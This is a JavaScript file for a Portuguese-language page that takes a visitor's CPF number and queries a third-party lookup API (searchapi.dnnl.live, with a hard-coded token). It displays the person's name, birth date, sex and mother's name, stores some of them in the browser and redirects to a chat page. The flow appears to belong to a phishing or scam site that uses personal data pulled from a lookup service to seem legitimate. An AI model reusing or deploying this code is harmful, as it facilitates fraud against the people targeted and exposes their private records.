document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const dataNascimento = document.getElementById("dataNascimento");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");

  // Formatar CPF enquanto digita
  function formatCPF(input) {
    let value = input.value.replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);
    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }
    input.value = value;
  }

  function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, "");
    return cpf.length === 11;
  }

  function formatDate(dateString) {
    if (!dateString) return "Não informado";
    if (dateString.includes("/")) return dateString;
    // Se vier YYYY-MM-DD ou YYYYMMDD
    const cleanDate = dateString.replace(/\D/g, "");
    if (cleanDate.length === 8) {
      return cleanDate.replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }
    return dateString;
  }

  // Consultar CPF na API dnnl.live
  async function consultarCPF(cpf) {
    try {
      const cpfLimpo = cpf.replace(/\D/g, "");

      // UI Reset
      consultaResultado?.classList.remove("hidden");
      loadingInfo?.classList.remove("hidden");
      userInfo?.classList.add("hidden");
      errorInfo?.classList.add("hidden");

      consultaResultado?.scrollIntoView({ behavior: "smooth", block: "center" });

      const response = await fetch(
        `https://searchapi.dnnl.live/consulta?token_api=0047&cpf=${cpfLimpo}`
      );

      if (!response.ok) throw new Error("Erro na conexão com o servidor.");

      const data = await response.json();
      loadingInfo?.classList.add("hidden");

      // Tenta extrair dados de diferentes estruturas possíveis (data.DADOS ou direto no data)
      const res = data.DADOS || data.dados || data;

      // Busca o nome em qualquer variação de chave (nome, NOME, Nome)
      const nomeEncontrado = res.nome || res.NOME || res.Nome;

      if (!nomeEncontrado) {
        throw new Error("CPF não encontrado ou base de dados indisponível.");
      }

      // Preenche os campos com fallback para várias chaves possíveis
      nomeUsuario.textContent = nomeEncontrado;
      dataNascimento.textContent = formatDate(res.data_nascimento || res.NASCIMENTO || res.nascimento || "");
      cpfUsuario.textContent = res.cpf || res.CPF || cpf;
      
      const sexoRaw = (res.sexo || res.SEXO || "").toUpperCase();
      sexoUsuario.textContent = sexoRaw.startsWith("M") ? "Masculino" : sexoRaw.startsWith("F") ? "Feminino" : "Não informado";
      
      nomeMae.textContent = res.nome_mae || res.MAE || res.NOME_MAE || "Não informado";

      // Salva para a próxima página
      const dadosUsuario = {
        nome: nomeEncontrado,
        cpf: cpfLimpo,
        nomeMae: nomeMae.textContent
      };
      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));

      userInfo?.classList.remove("hidden");
      setTimeout(() => { userInfo?.scrollIntoView({ behavior: "smooth", block: "center" }); }, 200);

    } catch (error) {
      console.error("Erro na API:", error);
      loadingInfo?.classList.add("hidden");
      errorMessage.textContent = error.message || "Erro ao buscar dados. Tente novamente.";
      errorInfo?.classList.remove("hidden");
    }
  }

  // --- Funções de Navegação e Interface ---
  function showCPFPage() {
    mainPage.classList.add("fade-out");
    setTimeout(() => {
      mainPage.classList.add("hidden");
      cpfPage.classList.remove("hidden");
      void cpfPage.offsetWidth;
      cpfPage.classList.add("fade-in");
      cpfPage.classList.remove("opacity-0");
      cpfInputPage.focus();
    }, 400);
  }

  function showMainPage() {
    cpfPage.classList.remove("fade-in");
    cpfPage.classList.add("opacity-0");
    setTimeout(() => {
      cpfPage.classList.add("hidden");
      mainPage.classList.remove("hidden");
      void mainPage.offsetWidth;
      mainPage.classList.remove("fade-out");
    }, 400);
  }

  function processForm() {
    const cpf = cpfInputPage.value.replace(/\D/g, "");
    if (!validateCPF(cpf)) {
      alert("Por favor, digite um CPF válido.");
      return;
    }
    if (!termsCheck.checked) {
      alert("Você deve aceitar os termos.");
      return;
    }
    consultarCPF(cpf);
  }

  function redirecionarParaChat() {
    const dados = localStorage.getItem("dadosUsuario");
    if (!dados) return;
    const urlParams = new URLSearchParams(window.location.search);
    const cpf = JSON.parse(dados).cpf;
    urlParams.set("cpf", cpf);
    window.location.href = `chat/chat/index.html?${urlParams.toString()}`;
  }

  // Event Listeners
  btnAtivar?.addEventListener("click", showCPFPage);
  btnSimular?.addEventListener("click", showCPFPage);
  btnVoltar?.addEventListener("click", showMainPage);
  btnAnalisar?.addEventListener("click", processForm);
  btnConfirmar?.addEventListener("click", redirecionarParaChat);
  btnCorrigir?.addEventListener("click", () => { consultaResultado.classList.add("hidden"); });
  btnTentarNovamente?.addEventListener("click", () => { consultaResultado.classList.add("hidden"); });
  cpfInputPage?.addEventListener("input", function() { formatCPF(this); });

  // Carrossel básico
  const slides = document.querySelectorAll(".carousel-item");
  let currentSlide = 0;
  if (slides.length > 0) {
    setInterval(() => {
      slides[currentSlide].classList.remove("active");
      currentSlide = (currentSlide + 1) % slides.length;
      slides[currentSlide].classList.add("active");
    }, 5000);
  }
});
